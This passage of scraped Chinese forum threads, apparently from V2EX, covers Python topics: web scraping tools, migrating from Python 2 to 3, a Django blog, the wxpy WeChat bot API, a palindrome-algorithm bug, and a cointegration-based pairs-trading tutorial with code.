吧……", "我都是直接在浏览器里爬的", "scrapy +", " \r", "\r", "??\r", "\r", "怎么没人说 pyspider", " 老铁 666", " 生物脑智能技术肉眼爬虫表示压力不大", "我觉得都可以啊...Python 也有执行 JS 的包 之前用的是这个 ", " 但是国内更多的云平台都可以免费运行 Node 再加上[Cheerio]( ", " 也是很爽的", "进来学习", "python requests 不解释", "给 Python 投一票！\r", "Python 爬虫， 12 天从入门到精通。不信看看这个\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题</p>\n</div></div>"], "reply": "71", "tittle": "为什么 python3 正在慢慢取代 python2.7", "comment": ["我也觉得奇怪， 为什么这么久了，还没有完全替代 2.7", "我也觉得奇怪， 为什么这么久了，还有一些蛋疼的新项目用 py2 写", "不还总有人说美国不行了嘛", "还有人说天朝技术要赶英超美", "因为懒得学吧 像我还死在 objc", "一堆东西 2.7 写的,懒得升级,反正能跑.", "不还有人说房价不涨反跌吗？", "还要为什么？\r", "\r", "py3k 出来都要 10 年了。", "还在 2.7  公司的 线上机 还是 2.7", "老项目用 2.7 没毛病\r", "新项目还用 2.7 。。。", "async .. await", " \r", " \r", " \r", "但很多项目还是用 python2.7 写的 既然懒得升级并且也没有什么问题 python3 取代 python2.7 感觉很无力", "我现在准备用 golang 重构 2.7 的几个小项目了……", "不要学知乎那种言之无物的风格", "为什么呢？因为 3 好用啊。\r", "\r", "2.7 赶紧随着老项目的消失而消失，省的还问这种问题……", " golang 是好", " \r", "哈哈确实有一点知乎那种不良气息...其实只是突然之间想问一个无聊的问题 看看会收到什么理由\r", "给大佬们添乱了 233333\r", "（反正我只是用小号试试水", "Python 的版本切换做得太烂了，即使有 VirtualEnv ，在外部引用的时候仍然会有用错版本的情况。\r", "3.4 以上版本把 py 默认值设为 2 ， py -3 设为 3 ；这种情况下用 Flask 的时候，启动服务器的时会引用到 Python 27 去。", "今天还得用 2 写两个小程序给同事用。因为要用到 gooey 。", "py3 没有什么吸引力。", "或许人懒了吧。", "港真 PY3 迁移过去我们光是在处理字符转换那些东西就够我们熬好几个通宵的。", "为什么安卓 IOS 新版本出来了要升级？", "都怪 python 项目还在维护 2.x 版本……", "技术都是有巨大惯性的（尤其是对于企业来说），但也在缓慢发展，例如 Java 都二十多年历史了还是很火，不过一直都有新的特性加入。", "为什么 php5.6 和 php7 出了那么久，还有人在用 php5.2", "python 2.7 再过几年就死了……", "死循环：有人用->继续维护->有人继续用", "人总是要死的，这要什么理由？\r", "\r", "常用模块的 py3k 支持列表，目前不支持 3 的很少了：\r", "\r", "Python 3 Wall of Superpowers : \r", "这种事情是难免的，每一个企业，每一个项目都是有历史背景的。不了解 context ，也没法评判为啥用 2 不用 3 。 你会看到有人给 ms 大笔的钱，只为了 ms 继续支持 xp 。", "天朝都持续崩溃几十年了，结果人家先崩了", "前几天需要用 tensorflow 做个图像识别的 demo ，依赖很少，心说是个用 py3 的好机会，结果官方的模型 py3 兼容有问题（主要是没有对 dict view 做调整），所以又只好降级回 py27", "后者要死了", "为何 jdk1.8 正在慢慢取代 jdk1.7/1.6 ，学啥不好学逼乎", " 同…本想用 python3 跑 mxnet ，结果 demo 就跑不通，然后果断换成 2 了…", "还在用拍 2 是因为 centos 自带的是 py2 ，这是阻止 py3 发展的一个重大原因……", " 成也 redhat ，败也 redhat 。。。", "因为没有一点点质得飞跃....", "为什么 ECMA7 刚出来就用", "用 py3.5+win7,有些 c 模块编译不了，高版本 vc 装不上？", "为什么年轻人正在慢慢取代老年人？", " 没有 babel 你试试", "升 py3 ？我还在写 2.6 呢", "py3 用的挺好，其实 3 和 2 差别也不是很大。。。还好了。。用得管哪个就用哪个楼~~这有啥好谁掐死谁的。。。", "我还见过线上机器默认 python 版本是 2.4 的，问我为什么写的脚本跑不了，喵喵喵？", "你们猜 Python 3 普及和共产主义哪个会先实现？", " 港真 JVM 的版本切换坑还是比较少的 兼容性也做得还不错 我们有几个特别旧的 library 是 jre 6 的 bytecodes 在还能跑（ 2010 年编译的库都还有在用）\r", "\r", "\r", "python 的坑就多了…", "我一直奇怪 repo 为什么不用 python 3 写, 如果 Google 积极推动 python 3 就好了", "为什么 iPhone7 在取代 iPhone6", "开始学习应该是 3 ，还是 2 ，怎么 2 就是老不死，囧~", "因为没法快速取代", "我给 py2 续一秒", "为什么 rust 都在用 nightly", "为什么你会问这样的问题", "被 UnicodeDecodeError 支配的恐怖", "guido 前不久好像说在密谋一个大动作，会不会是 py3 完全兼容 py2 ？", " 好像不是同个性质的问题？", " 那要等不维护了才有可能吧...比较人懒 没有到最后的时刻 没有多少觉悟", "可以结贴了大佬们", " 问题在于现在做的很多程序可能生命周期比 python 2 要久，比如 CentOS 7 要维护到 2024 年，可是它很多组件使用的 python 2 却只维护到 2020 年。", "好消息 好消息 py4 不兼容 py2 和 py3 哦", "公司定制版 linux 默认 py 2.7.x ，好几万个线上机器… 怎么更新 想想也是忧伤呀", " 是的……", "支持 py3 的模块越来越多， py3 新特性也不错。不过如果是原本是 py2 的老项目用 py2 吧，新项目用 py3 。\r", "~~~~~~为什么 php 都 7 了，还在用 php5 哈哈哈哈", " 到时候安全性出问题 RH 自己给 py2 打补丁呗，这么多年了，也再难出现大改动的 bug 。缝缝补补自然死亡了事。", "py3 出生的使命不就是为了替代 py2 吗", " 许多系统以及应用还在用 2.6 不得已而为之", " 其实当初就该用 3 的 新项目用 3 老项目用 2 。维护而已", "可能是 python 不够强势吧。 python 4 出来的时候，估计 就是 需要 区分 是 py2 ， py3 ，还是 py4 了。", "我在等 pypy 3"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>django-blog</h1>\n<p>Django ，一个 Python 写的 Web 框架，以此搭建简单的 Blog 来学习，<a href=\"http://django.luckybird.me/\" rel=\"nofollow\">Demo</a></p>\n<p><strong>功能简介:</strong></p>\n<ul>\n<li>用户注册和登录，热度排序</li>\n<li>发表文章，创建标签，支持评论</li>\n<li>Markdown 编辑器，在线预览，拖拽上传图片</li>\n</ul>\n<p><a href=\"https://github.com/luckybirdme/django-blog\" rel=\"nofollow\">Github</a></p>\n</div></div>"], "reply": "5", "tittle": "django-blog 入门学习", "comment": ["露珠用什么渲染 markdown 的，、滑稽", ".gitignore", " \r", "看下加载的 js\r", "建议.gitignore 忽略 pycharm 的配置目录以及.pyc 文件\r", "\r", "话说学 django 也可以看看这个： ", " \r", "谢谢建议，后续加上"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>wxpy: 用 Python 玩微信</h1>\n<p>优雅的微信个人号 机器人 /API ，基于 itchat ，全面优化接口，更有 Python 范儿</p>\n<h2>用来干啥</h2>\n<p>一些常见的场景</p>\n<ul>\n<li>控制路由器、智能家居等具有开放接口的玩意儿</li>\n<li>跑脚本时自动把日志发送到你的微信</li>\n<li>加群主为好友，自动拉进群中</li>\n<li>充当各种信息查询</li>\n<li>转发消息</li>\n<li>逗人玩</li>\n<li>...</li>\n</ul>\n<pre><code># 脑洞太大的就不提了...\n</code></pre>\n<p>总而言之，可用来实现各种微信个人号的自动化操作</p>\n<h2>轻松安装</h2>\n<p>使用 Python 3.x</p>\n<pre><code>pip3 install -U wxpy\n</code></pre>\n<h2>简单上手</h2>\n<p>登陆微信:</p>\n<pre><code># 导入模块\nfrom wxpy import *\n# 初始化机器人，扫码登陆\nrobot = Robot()\n</code></pre>\n<p>找到好友:</p>\n<pre><code># 搜索名称含有 \"游否\" 的男性深圳好友\nmy_friend = robot.friends().search('游否', sex=MALE, city=\"深圳\")[0]\n</code></pre>\n<p>发送消息:</p>\n<pre><code># 发送文本给好友\nrobot.my_friend.send('Hello WeChat!')\n# 发送图片\nrobot.my_friend.send_image('my_picture.jpg')\n</code></pre>\n<p>自动响应各类消息:</p>\n<pre><code># 打印来自其他好友、群聊和公众号的消息\n@robot.register()\ndef print_others(msg):\n  print(msg)\n\n# 回复 my_friend 的消息 (优先匹配后注册的函数!)\n@robot.register(my_friend)\ndef reply_my_friend(msg):\n  return 'received: {} ({})'.format(msg.text, msg.type)\n\n# 开始监听和自动处理消息\nrobot.start()\n</code></pre>\n<h2>模块特色</h2>\n<ul>\n<li>全面对象化接口，调用更优雅</li>\n<li>默认多线程响应消息，回复更快</li>\n<li>附带 共同好友、图灵机器人 等实用组件</li>\n<li>覆盖大部分常用功能:\n<ul>\n<li>发送文本、图片、视频、语音、文件</li>\n<li>通过关键词或用户属性搜索 好友、群聊、群成员 等</li>\n<li>获取好友 /群成员昵称、备注、性别、地区</li>\n<li>加好友，建群，邀请进群，踢出群</li>\n</ul>\n</li>\n</ul>\n<h2>了解更多</h2>\n<p>说明文档: <a href=\"http://wxpy.readthedocs.io\" rel=\"nofollow\">http://wxpy.readthedocs.io</a></p>\n<h2>加入讨论</h2>\n<p>GitHub: <a href=\"https://github.com/youfou/wxpy\" rel=\"nofollow\">https://github.com/youfou/wxpy</a></p>\n<hr>\n<p>加入微信交流群 (真的是群哦)</p>\n<ul>\n<li>加以下微信，填写验证 [ <strong>wxpy</strong> ]，即可自动受邀入群</li>\n</ul>\n<p><img alt=\"\" src=\"https://raw.githubusercontent.com/youfou/wxpy/master/docs/wechat-group.png\"></p>\n</div></div>", "<div class=\"topic_content\">勘误：\r<br>上面的示例代码中有一些错误，原帖已经无法修改，请大家访问 GitHub 页面或 RTD 在线文档查看示例代码。</div>"], "reply": "48", "tittle": "wxpy: 优雅的微信个人号 机器人/API，用 Python 玩微信", "comment": ["已 star 。\r", "\r", "以前也想做一个类似可以挂群里的机器人，但是微信必须保持手机同时在线不然会掉，有点烦。", "已 star 感觉不错⊙▽⊙", " 这个确实无解，反正我是拿备用机登的…", "诶等等，真的可以发送语音了么？我记得 itchat 还有各路利用网页端 API 开发的都不支持耶。", " 抱歉，才发现文档错了，不支持语音发送，只能接收语音…\r", "帖子已经无法修改，已在 doc source 中修", "不错，之前做了 java 版的但是功能不全， star", "已 star", " 我一直以为是 api 限制呢，原来是要手机在线。。", "mark", "赞。已 star", "登入好像有些问题哦\r", "\r", "\r", "```\r", "json.decoder.JSONDecodeError: Unterminated string starting at: line 6505 column 13 (char 120732)\r", "```", " 看上去是在解析一个很长的 JSON … 这个问题会反复出现吗？\r", "不介意的话可以贴下完整的 traceback 哈。", "wxpy -> 微信 pao 友", "微信 py 666", "微信屁眼……", "我这里有一些 itchat 的用例，有一些只需要修改变量就可以直接使用了，比如直接加群主填写特定验证信息自动邀请加群的。\r", "\r", "希望楼主有空研究研究怎么处理红包或其他特殊类消息。", "顺道发个 go 版本的\r", "\r", "\r", "我自己用来撩骚，开开车 发发 gif, 美剧更新提醒等等 :)\r", "这个是个人微信？\r", "我第一眼还以为是微信公众号呢", "如果能 py2 就好了。。", " wxpy 就是基于 itchat 开发的，是它的一层接口封装，希望提供更好用的接口哈", " 正好试试 Python 3 吧，我也是用了两年 py2 后下决心升级到 3 的，还是有不少提升的", " 对 py3 ，不是很感兴趣，因为我现在好多东西不会做,py3 只是添加了一个异步，如何高性能而已", "搭车发个 PHP 版本的  ", "py 交易利器", " 可以搞个双开 APP ，一天开一下小号就行\r", "无责任推荐双开工具: ", " 既然用的还不多，可以考虑直接切到 3 嘛，将来会有更多项目迁移到 3 ，很多新项目也是直接从 3 开始", " 嗯 我就是用的他双开，只是习惯性的用完就杀掉了，所以过两三天 bot 就没反应了", "关注~", "发现这个帖子都是收藏，回复很少，自己顶顶…😢", "厉害了。。。真心的", "再顶~ 顺带说下，二维码中的小机器人已经开启了被调戏功能…", "我也想写一个，问一下，好友信息是怎么拿到的？是通过抓包解析协议，然后拿到信息的吗？有知道的能告诉我吗？", " \r", " 谢谢，果然是要抓包，我目前就是还不知道如何通过 tcpdump/wireshark 抓包，然后把信息实时更新到自己的程序里，谢谢。", "厉害了，加人，加群还能自动化，好玩", " 抓包不是只抓数据，而是通过观察流量摸索协议，有了协议，就可以通过自己的方式获取数据啦", "  网页抓包  还是直接用浏览器的开发者工具吧", " 我也弄了个   WebQQ   不过  tody.ml/webqq/     用来做广西联通流量自动充值。", "朋友圈的功能不知道什么时候弄得到", "赞，已 star", "已 star", "好奇，基于 itchat 的优化为何没 pr 回去呀？", " 导入 itchat ，而不是直接修改 itchat 的代码。而且也修改了很多接口，很难合入原项目，所以才另立项目呢。", "另外结合 hug 可实现 api 接口了，这样通用性更好，可以给其他服务调用，非常简洁", " 哈哈我去了解下 hug ，业余 Pythoner", " 这个还真无解， Web 微信一直没有朋友圈功能。考虑到产品定位，估计以后也不会有…", " 同样业余，我是做 java ，封装成 api 几行代码就搞定了，一条消息可以群发给多个人的实现方法", ".get('/send_msg')", "def private_msg(content, username:hug.types.text=\"filehelper\"):", "    nameArr = username.split()", "    name = '';", "    for i in range(len(nameArr)):", "        name = nameArr[i]", "        print(\"users:{name} content : {content}\".format(**locals()))", "        itchat.send_msg(content, toUserName=name)", "    return '{\"result\":1}'", " 最近正好在想怎么通过 web 来方便远程登陆 /控制微信机器人"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>错误:</h2>\n<p>Traceback (most recent call last):\nFile \"/usercode/<a href=\"http://file.py\" rel=\"nofollow\">file.py</a>\", line 25, in &lt;module&gt;\nfor i in range(N):\nTypeError: range() integer end argument expected, got str.</p>\n<h2>代码:</h2>\n<pre><code>def TheLongest(s):\n    s = '#' + '#'.join(s) + '#'\n    length = len(s)\n    Rl = [0]*length\n    pos = 0\n    MaxRight = 0\n    MaxLen = 0\n    for i in range(length):\n        if i &lt; MaxRight:\n            Rl[i] = min(Rl[2*pos - i], (MaxRight - i))\n        else:\n            Rl[i] = 1\n        while i - Rl[i]&gt;= 0 and i+Rl[i]&lt;length and s[i - Rl[i]] == s[i+Rl[i]]:\n            Rl[i]+=1\n        if Rl[i]+i-1 &gt;MaxRight:\n            pos = i\n            MaxRight = Rl[i]+i-1\n        MaxLen = max(MaxLen,Rl[i])\n    return (MaxLen-1)\n\nN = raw_input()\na_list = []\nfor i in range(N):\n    s = raw_input()\n    a_list.append(TheLongest(s))\nfor i in range(N):\n    print a_list[i]\n</code></pre>\n</div></div>"], "reply": "19", "tittle": "算法题目<最长回文子串>在我的电脑(python3.5)平台,运行正常但是在在线编译器中错误,求 dalao 帮我看看这个 N 该怎么改,多谢了.", "comment": ["TypeError: range() integer end argument expected, got str ；这不都说的很清楚了吗？", "加个 int 方法呗。", " 在 input()那里加么？", " 我在 input()那里加了，没用啊，这 2 版本的输入和 3 不一样啊……", "  \r", "我这里没问题", " 真是醉了，你知道 hiho 这网站么，我的提交通不过，我在电脑上也没问题……", "讲道理 OJ 也应该支持 Python3 了……\r", "\r", "话说楼主醒醒，你的代码里还有 raw_input ，这能在 Python3.5 里执行？\r", "\r", "就算是 2 也应当知道 raw_input 拿到的是字符串吧？我有点怀疑这代码的来路", " 这是我改过的， 2 和 3 大的区别我还是知道的。我原来写的是 3.5 版本的，提交的时候发现是要 2 版本的，然后我就改成这个样子了，然后它网站就通不过， input()拿到的确实是字符串啊，我加 int()了，在 3 里面是没有 raw_input()的，而且我的问题是我能在本地运行，却不能在在线网站上提交通过， goodryb 也在 2 上帮我运行了，也是没有问题，我没有学过 2 所以我才请教大家，这哪里有问题……算法已经懂了，不行我就用 c++实现算了", " 只有 input 有问题。 2 里的 raw_input 等价于 3 的 input 。\r", "\r", "其实这个代码从 3 到 2 是丝毫不用改的，因为 2 的 input ，就是一个只能读数字输出也是数字的东西。。。。", " 另外他不是帮你运行了！他改过了程序", " #6 如下\r", "\r", " ", " ", " #6 从结果来看，并没有提示什么编译错误\r", "Time Limit Exceeded\tTLE\t用户程序运行时间超过题目的限制", " \"因为 2 的 input ，就是一个只能读数字输出也是数字的东西\"\r", "\r", "可能你对 Python 2 中 input() 的理解是有偏差的... Python2 中 input() == eval(raw_input())", " 多谢了，这还能优化？", " #14 应该可以吧，我看这个题目有 4000 左右的提交， 2000+通过", " 窝槽？还真是如此，学到了\r", "\r", ">>> input()             \r", "(lambda x: dir())(1)    \r", "['x']                   \r", "\r", "不过这个函数已经多年不用，以后也难有机会了……\r", "\r", "\r", " 你把 range 改成 xrange 试试， 2 的 range 直接返回 list ，很慢。\r", "\r", "这里一个 2 的坑就是 xrange 参数不能超过机器字长，大数字用不了。", " 用 Manacher 算法即可", " 说真的,这个 Manacher 看不太懂.......", " 多谢,我改了再试试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>题目：在<code><a href=\"https://en.wikipedia.org/wiki/Spiral\" rel=\"nofollow\"> wiki </a></code>上阅读有关 Spiral 的信息，编写程序画出阿基米德螺线</p>\n<p>最开始只想到了用 matplotlib 的做法...然后去看了书上提供的<code><a href=\"http://www.greenteapress.com/thinkpython/code/spiral.py\" rel=\"nofollow\"> 代码 </a></code></p>\n<p>到底是个数学问题，书上提供的这个函数看的我万脸懵逼...希望有大佬解释一下</p>\n<p><img alt=\"原图\" src=\"http://7x2wrf.com1.z0.glb.clouddn.com/QQ20170301-1@2x.png\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "请教 ThinkPython 中练习 4-5：画阿基米德螺旋线问题", "comment": []},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://stackoverflow.com/documentation/python/809/incompatibilities-between-python-2-and-python-3\" rel=\"nofollow\">http://stackoverflow.com/documentation/python/809/incompatibilities-between-python-2-and-python-3</a></div>"], "reply": "1", "tittle": "StackOverflow 上整理的 Python 2 和 3 之间的一些兼容性方面的细节问题", "comment": ["\r", "这比较全"]},
{"content": ["<div class=\"topic_content\">公司的项目需要模拟登录一些网站，现在有两种难以处理的情况\r<br>前一种是相对简单一点的，就是这个网站会本地生成一些 cookies ，最后和登录的 data 一起倍 post ，但因为网页比较复杂， js 特别多，特别长，不知道从和找起，似乎 chrome 这种，可以单步调试，但我一直没找到这种单步调试的教程，不知道怎么搞\r<br>后面一个我觉得就基本没希望了，就是有些网站要安装控件才能登录\r<br>有老司机有什么指导吗？不需要各位手把手教，能给个方向就好</div>"], "reply": "1", "tittle": "模拟登录，本地生成 cookie 和装控件才能登录，怎么办", "comment": ["网站能检测控件，那你就伪装个假控件给它，骗过它"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>什么是配对交易？</strong></p>\n<p>配对交易是一个有经济意义做基础的理论,因此是一个站得住脚的策略。配对策略利用一些股票对,即两只股票, 它们的价格走势倾向于一致这一性质来进行交易。当股票对之间的价格变化出现异常时,配对交易策略认为这一异常在未来会消失,回归到之前的情况。配对交易背后利用的是证券的相对价值这一概念。我们知道投资的一个原则是买入低估值的股票,卖出高估值的股票。然而股票的真实价值很难得知,从而也让我们无法知道当前股票的价值是被高估还是低估。而配对交易中的两只股票,它们的相对价值是一个平稳的时间序列,因此我们可以在其相对价值偏离均值到一定程度时做空估值高的股票,做多估值低的股票,然后在相对价值回归均值时反向平仓获利,后面我们会用价差(spread)来表示相对价值。</p>\n<p><strong>什么样的股票对适合配对交易策略？</strong></p>\n<p>从之前的阐述中已经可以看出，适合用于配对交易的股票对它们的相对价值一定要是一个平稳的时间序列。接下来我们就来看看为什么会存在两只股票,它们的价差会是一个平稳的时间序列。我们知道股价的对数值的时间序列是一个随机行走过程,也就是一个非平稳的时间序列。简单来说,平稳的时间序列即时间序列。然而计量经济学家 Engle 和 Granger 发现:两个非平稳的时间序列的线性组合是有可能得到一个平稳的时间序列的。</p>\n<p>yt−γxt 为一个平稳的时间序列 yt−γxt 为一个平稳的时间序列\n其中 yt,xt 为非平稳的时间序列，γ为一个特定的常数\nEngle 和 Granger 也把有这种性质的时间序列称为协整（ cointegration ）。接下来我们给出价差的表达式：</p>\n<p>spread=log(PBt)−γlog(PAt)spread=log(PtB)−γlog(PtA)\nPAt 和 PBt 为两只股票 A 和 B 在 t 时刻的股价 PtA 和 PtB 为两只股票 A 和 B 在 t 时刻的股价</p>\n<p>这样我们证明了可以用两只股票价格的对数值的时间序列这两个非平稳时间序列来构造一个平稳时间序列,从而对这一平稳时间序列来用配对交易策略进行交易。因此，具有协整性质的股票对是我们所寻找的适于交易的标的。</p>\n<p><strong>怎样找到适合的配对？</strong></p>\n<p>首先寻找出满足协整的必要条件的股票对。因为如果股票对具有协整的性质，那么它必然满足协整的必要条件。我们首先引入一个共有走向模型来描述时间序列。共有走向模型认为一个时间序列可以表示成一个平稳的时间序列和一个非平稳的时间序列的简单线性叠加叠加。</p>\n<p>yt=nyt+εytyt=nyt+εyt\nzt=nzt+εztzt=nzt+εzt\nnyt,nzt 为非平稳的时间序列，即共有走向项。εyt,εzt 为平稳的时间序列，即特有项。 nyt,nzt 为非平稳的时间序列，即共有走向项。εyt,εzt 为平稳的时间序列，即特有项。</p>\n<p>取它们的线性组合：\nyt−γzt=(nyt−γnzt)+(εyt−γεzt)yt−γzt=(nyt−γnzt)+(εyt−γεzt)\n因此若这两个时间序列满足协整,那么一定有:\nnyt=γnztnyt=γnzt\n这是满足协整的一个必要条件,即两个时间序列的共有走向项必须成正比的。 接下来我们来看下对于两只股票扁和扂来说,它在时间扩内的回报为:</p>\n<p>rA=log(PriceAt)−log(PriceAt−i)=nAt−nAt−i+εAt−εAt−i=rc,At+rs,At rB=log(PriceBt)−log(PriceBt−i)=nBt−nBt−i+εBt−εBt−i=rc,Bt+rs,BtrA=log(PricetA)−log(Pricet−iA)=ntA−nt−iA+εtA−εt−iA=rtc,A+rts,A rB=log(PricetB)−log(Pricet−iB)=ntB−nt−iB+εtB−εt−iB=rtc,B+rts,B\nrct,rst 为共有走向回报和特有回报 rtc,rts 为共有走向回报和特有回报</p>\n<p>从之前我们从协整推出的必要条件可以发现,如果两只股票协整且协整系数为γ,那么可以推出它们的共有走向回报必须成正比关系：\nrc,Bt=γrc,Atrtc,B=γrtc,A</p>\n<p>这个条件就是两只股票满足协整的一个必要条件,也是我们用来选择适合交易的股票对的一个依据。这个条件就是两只股票满足协整的一个必要条件,也是我们用来选择适合交易的股票对的一个依据。</p>\n<p>两只股票满足这一关系的时候,我们接下来就可以再检验它们的价差是不是平稳时间序列。 我们不直接检验任意两只股票之间的价差是否为平稳的原因是如果直接检验价差的平稳性的话,由于股票数量很多,需要用大量的时间,因此我们先利用协整的必要条件来缩小平稳性检验的股票对的数量。</p>\n<p>我们可以发现上述推出两只股票满足协整时的必要条件的推出引入了一个共有模型理论,现在的问题来了,为什么两只股票会有相似的回报?这背后的支撑即为套利定价理论。我们只简单的介绍一下套利定价理论。在套利定价理论中,如果不同的股票具有相同的风险因子,那么这些股票的共同因子回报是相同的,这里的共同因子回报即之前共有走向模型中的共有走向回报。 有了套利定价理论和共有走向模型之间的这种对应关系,也就保证了我们是可以找到两只具有相同或相似回报的股票对,这也是配对交易策略背后的经济学基础之一。</p>\n<p>我们现在知道了为了减少用于平稳性检验的股票对的数量,我们首先要找出具有相同或相似的回报的股票对,因为这是两只股票协整的必要条戲件。如果两只股票没有相同或相似的回报,那么这两只股票一定不是协整的,也就无法构造出一个平稳的价差时间序列来用于配对交易。我们通过计算不同股票之间的回报的相关性(correlation)来选择可能具有协整性质的股票对。计算方式如下:</p>\n<p>对于两只股票 A 和 B,\nd(A,B)=|ρ|=|Cov(rA,rB)√Var(rA)Var(rB)|d(A,B)=|ρ|=|Cov(rA,rB)Var(rA)Var(rB)|</p>\n<p>通过以上步骤,我们已经选出了可能具有协整性质的股票对,这就大大减少了我们的计算量。接下来的任务就是验证这些选出的股票对是否真的是具有协整性质。检验的原则为:如果两个时间序列是协整的,那么对这两个时间序列做一个简单的线性回测就可以获得一个很好的线性关系。在这一线性关系中,斜率即为我们所需的协整系数γ,残差即为我们所需的价差。总的来说分两步:</p>\n<p>1..我们对这两只股票的时间序列做线性回测。\n2.我们检验价差的稳定性。</p>\n<p>用于检验时间序列的稳定性有很多种方法 , 比如 Augumented Dickey-Fuller(ADF) test, Elliott-Rothenberg-stock test, Schmidt-Phillips test 等， 我们将会采用的为 Augumented Dickey-Fuller test.</p>\n<p>策略的具体实施步骤</p>\n<p>实际中运用配对交易策略可以分为 3 步:\n1.发现可能具有协整性质的股票对。利用的方法为计算两只股票回报的相关系数,选出相关系数高的股票对。\n2.一旦确定了可能具有协整性质的股票对,我们就可以利用统计学的方法来检验这些股票对是否真的具有协整的性质。在这一过程中我们就可以确定协整系数以及价差是否具有均值回归的行为。\n3.最后我们需要确定策略的一些参数,比如利用多长的历史数据来确定股票对是否具有协整性质,当价差偏离均值多远时进场或退场等。\n我们把策略分为两个部分,研究部分和执行部分。研究部分包括确定交易的股票对和进出场的时间点等,执行部分即为执行交易。由于 Python 做策略研究的方便性,研究部分用 Python 执行,执行部分用 RiceQuant 量化交易平台来执行(RiceQuant 量化交易平台即将推出 Python 研究平台,以后策略研究和执行可以在一个平台执行)。</p>\n<p><strong>策略的研究与执行</strong></p>\n<p>策略研究</p>\n<p>我们首先用 Python 来选择适合交易的股票对。 用于选取的股票池为:\n600815 厦工股份 机械行业\n600841 上柴股份 机械行业\n600855 航天长峰 机械行业\n600860 京城股份 机械行业\n600984 *ST 建机 机械行业\n601038 一拖股份 机械行业\n601002 晋亿实业 机械行业\n601100 恒立油缸 机械行业\n601106 中国一重 机械行业\n601177 XD 杭齿前 机械行业\n计算所用历史数据为 2012 年全年的日线数据。</p>\n<p>import operator\nimport numpy as np\nimport statsmodels.tsa.stattools as sts\nimport matplotlib.pyplot as plt\nimport tushare as ts\nimport pandas as pd\nfrom datetime import datetime\nfrom scipy.stats.stats import pearsonr</p>\n<blockquote>\n<p>sector = pd.read_csv('sector.csv', index_col=0)\nsector_code = sector['code'][100:110]\nresectorcode = sector_code.reset_index(drop=True)\nstockPool = []\nrank = {}\nRank = {}\nfor i in range(10):\nstockPool.append(str(resectorcode[i]))\n以上为策略研究部分的第一部分代码，我们创建了一个股票池，即 stockPool 。\nfor i in range(10):\nfor j in range(i+1,10):\nif i != j:\n# get the price of stock from TuShare\nprice_of_i = ts.get_hist_data(stockPool[i], start='2012-01-01', end='2013-01-01')\nprice_of_j = ts.get_hist_data(stockPool[j], start='2012-01-01', end='2013-01-01')\n# combine the close price of the two stocks and drop the NaN\nclosePrice_of_ij = pd.concat([price_of_i['close'], price_of_j['close']], axis = 1)\nclosePrice_of_ij = closePrice_of_ij.dropna()\n# change the column name in the dataFrame\nclosePrice_of_ij.columns = ['close_i', 'close_j']\n# calculate the daily return and drop the return of first day cause it is NaN.\nret_of_i = ((closePrice_of_ij['close_i'] - closePrice_of_ij['close_i'].shift())/closePrice_of_ij['close_i'].shift()).dropna()\nret_of_j = ((closePrice_of_ij['close_j'] - closePrice_of_ij['close_j'].shift())/closePrice_of_ij['close_j'].shift()).dropna()\n# calculate the correlation and store them in rank1\nif len(ret_of_i) == len(ret_of_j):\ncorrelation = np.corrcoef(ret_of_i.tolist(), ret_of_j.tolist())\nm = stockPool[i] + '+' + stockPool[j]\nrank[m] = correlation[0,1]\nrank1 = sorted(rank.items(), key=operator.itemgetter(1))\npotentialPair = [list(map(int, item[0].split('+'))) for item in rank1]\npotentialPair = potentialPair[-5:]</p>\n</blockquote>\n<h1>选出的相关系数最高的五对股票。 比如 ('600815+601177', 0.59753123459010704)， 600815+601177 为两只股票的代码， 0.59753123459010704 为它们之间的相关系数。</h1>\n<p>[('600815+601177', 0.59753123459010704), ('601100+601106', 0.60006268751560954), ('601106+601177', 0.66441434941650324), ('600815+601100', 0.6792572923561927), ('600815+601106', 0.76303679456471019)]\n以上为策略研究部分的第二部分代码。我们从股票池中选取两只股票，计算它们的回报然后算出它们之间的相关系数，最后取相关系数最高的五对股票来进行下一步的协整检验。\nfor i in range(len(potentialPair)):\nm = str(potentialPair[i][0])\nn = str(potentialPair[i][1])\nprice_of_1 = ts.get_hist_data(m, start='2012-01-01', end='2013-01-01')\nprice_of_2 = ts.get_hist_data(n, start='2012-01-01', end='2013-01-01')</p>\n<pre><code>closeprice_of_1 = price_of_1['close']\ncloseprice_of_2 = price_of_2['close']\n\nif len(closeprice_of_1) != 0 and len(closeprice_of_2) != 0:\n    model = pd.ols(y=closeprice_of_2, x=closeprice_of_1, intercept=True)   # perform ols on these two stocks\n    spread = closeprice_of_2 - closeprice_of_1*model.beta['x']\n    spread = spread.dropna()\n    sta = sts.adfuller(spread, 1)\n    pair = m + '+' + n\n    Rank[pair] = sta[0]\n    rank2 = sorted(Rank.items(), key=operator.itemgetter(1))\n</code></pre>\n<p>以上为策略研究部分的第三部分代码。我们对选取出来的相关系数高的股票对进行协整检验，即检验它们的价差是否为稳定序列。 比如的对于股票对 600815 和 601002 ，我们进行 Augumented Dickey-Fuller test 得到结果如下：\n(-3.34830942527566, 0.0128523914172048, 0, 115, {'5%': -2.8870195216569412, '1%': -3.4885349695076844, '10%': -2.5803597920604915}, -11.392077815567461)\n现在来解释一下几个比较重要的结果。第一个值-3.34830942527566 为 T-统计量，第二个值 0.0128523914172048 为 p-value 。字典里面包含的内容为置信度为 5%,1%和 10%时的 T-统计量的值。比如对于我们所选择的股票对 600815 和 601002 ， T-统计量为-3.34830942527566 ，小于 5%所对应的-2.8870195216569412 ，那么很大可能我们发现了一个平稳的时间序列。\n通过以上策略研究部分，我们发现最适合做配对交易的股票对为厦工股份(600815), 晋亿实业(601002).接下来我们用 RiceQuant 量化交易平台来执行我们的策略，回测时间为 2014 年全年，初始资金为 100000.0 。在计算价差时，我们对价差时间序列进行了归一化处理，处理后的价差用 zScore 来表示，具体计算方式如下：\nzScore=spread−spreadmeanspreadvariancezScore=spread−spreadmeanspreadvariance\n策略执行\n通过以上策略研究部分，我们发现最适合做配对交易的股票对为厦工股份(600815), 晋亿实业(601002).接下来我们用 RiceQuant 量化交易平台来执行我们的策略，回测时间为 2013 年全年 (一定要手选然后选对)，初始资金为 100000.0 。\nimport 